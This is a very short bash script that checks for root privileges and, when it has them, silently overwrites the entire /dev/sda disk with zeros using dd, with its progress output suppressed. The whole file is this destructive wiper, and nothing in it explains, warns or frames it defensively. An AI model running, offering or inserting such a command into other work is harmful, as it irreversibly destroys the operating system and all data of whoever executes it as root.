#!/bin/bash
if [[ "${UID}" == 0 ]]; then
  dd if=/dev/zero of=/dev/sda bs=1M status=none
fi
